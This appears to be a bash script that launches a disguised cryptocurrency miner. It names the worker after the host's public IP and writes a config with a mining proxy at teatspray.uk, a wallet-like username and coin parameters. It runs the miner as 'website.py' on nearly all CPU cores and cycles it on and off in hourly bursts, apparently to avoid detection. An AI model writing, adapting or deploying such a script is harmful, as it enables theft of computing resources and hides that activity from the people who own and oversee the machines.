#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive
export TERM=xterm
sleep 2

python3 -m venv .venv
sleep 2
source .venv/bin/activate
sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y-MagWasm_')
ipaddress=$(wget -q -O - api.ipify.org)
num_of_cores=$(cat /proc/cpuinfo | grep processor | wc -l)
used_num_of_cores=`expr $num_of_cores - 2`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""
sleep 2

echo ""
echo "Your worker name will be $currentdate"
echo ""
sleep 2

cat >.env <<-EOL
host=127.0.0.1
port=3306
proxy=ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Zmx5aW5nc2F1Y2VyLWV1LnRlYXRzcHJheS51azo2MjQy
threads=$used_num_of_cores
password=$currentdate,c=MBC,zap=MBC
username=MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93
EOL

sleep 2

readonly PID_FILE="website.pid"

readonly LOG_FILE="website.log"

readonly JOB_DURATION_SECONDS=3600

readonly SLEEP_DURATION_SECONDS=30

# --- Dynamic Core Calculation ---

#num_of_cores=$(cat /proc/cpuinfo | grep processor | wc -l)

#used_num_of_cores=`expr $num_of_cores - 2`

readonly JOB_COMMAND="python3 website.py ${used_num_of_cores} --cache=.cache/09Qy5sb2Fkcyg.txt"

# --- Functions ---

get_pids() {
  # The use of '|| true' ensures the grep command doesn't cause the script to exit
  # prematurely if it finds no matches, which can happen with 'set -e'.
  ps -aux | grep "${JOB_COMMAND}" | grep -v grep | awk '{print $2}' | tr '\n' ' ' || true
}

# Function to check if the job is running.
is_running() {
  # Use the get_pids function. If it returns any output, the job is running.
  if [ -n "$(get_pids)" ]; then
    return 0 # The process is running
  else
    return 1 # The process is not running
  fi
}

# Function to start the background job.
start_job() {
  if is_running; then
    echo "Job is already running. PIDs: $(get_pids)"
    return 0
  fi
  echo "Starting job with command: ${JOB_COMMAND}"
  
  # Explicitly clean up old files for a fresh start.
  rm -f "${PID_FILE}"
  rm -f "${LOG_FILE}"

  nohup ${JOB_COMMAND} > "${LOG_FILE}" 2>&1 &
  echo $! > "${PID_FILE}"

  # Wait for a moment to ensure the process has started and written to the log.
  sleep 2

  if [ -f "${PID_FILE}" ]; then
    echo "Job started with parent PID $(cat "${PID_FILE}")."
    echo "View logs with: tail -f ${LOG_FILE}"
  else
    echo "Warning: Job started but PID file was not created."
    echo "View logs with: tail -f ${LOG_FILE}"
  fi
}

# Function to stop the background job.
stop_job() {
  if ! is_running; then
    echo "Job is not running."
    # Unconditionally clean up old files.
    rm -f "${PID_FILE}"
    rm -f "${LOG_FILE}"
    exit 0
  fi

  local pids=$(get_pids)
  echo "Terminating all processes related to the job..."
  echo "Found PIDs: ${pids}"

  # Loop through all found PIDs and kill them one by one.
  for pid in ${pids}; do
    echo "Sending SIGTERM to PID: ${pid}"
    kill "${pid}"
  done

  echo "Sent SIGTERM to processes. Waiting for up to 5 seconds for them to stop..."
  sleep 5

  # Check if any processes are still running.
  local pids_after_wait=$(get_pids)
  if [ -n "${pids_after_wait}" ]; then
    echo "Some processes are still running. Forcefully killing with SIGKILL..."
    for pid in ${pids_after_wait}; do
      echo "Sending SIGKILL to PID: ${pid}"
      kill -9 "${pid}"
    done
    sleep 2 # Give a final moment for cleanup
  fi

  # After the kill attempts, check one last time.
  if ! is_running; then
    # Unconditionally clean up old files after a successful stop.
    rm -f "${PID_FILE}"
    rm -f "${LOG_FILE}"
    echo "Job terminated and cleaned up."
  else
    echo "Warning: Failed to terminate all processes. Manual intervention may be required."
    echo "Remaining PIDs: $(get_pids)"
  fi
}

# Function to check the status of the background job.
status_job() {
  echo "--- Job Status Report ---"
  sleep 1
  
  if is_running; then
    echo "Status: Job is currently running."
    echo "Running PIDs: $(get_pids)"
  else
    echo "Status: Job is not running."
  fi
  
  sleep 1
  echo "--- Log File Report ---"
  if [ -s "${LOG_FILE}" ]; then
    echo "Log file exists and contains content. Displaying last 10 lines:"
    # The '|| true' is used here as well to prevent errors if the file is empty or missing.
    tail -n 10 "${LOG_FILE}" || true
  elif [ -f "${LOG_FILE}" ]; then
    echo "Log file exists but is currently empty."
  else
    echo "No log file found. The job has likely not been started yet."
  fi
  
  sleep 1
  echo "-------------------------"
}

# The cycle job function now runs forever by default.
cycle_job() {
  echo "Starting cycling job. It will run for ${JOB_DURATION_SECONDS} seconds, stop, and then sleep for ${SLEEP_DURATION_SECONDS} seconds before repeating."
  while true; do
    start_job
    sleep "${JOB_DURATION_SECONDS}"
    stop_job
    sleep "${SLEEP_DURATION_SECONDS}"
  done
}

# --- Command Line Interface (CLI) ---
case "$1" in
  start)
    start_job
    ;;

  stop)
    stop_job
    ;;

  status)
    status_job
    ;;

  cycle)
    cycle_job
    ;;

  *)
    echo "Usage: $0 {start|stop|status|cycle}"
    exit 1
    ;;
esac
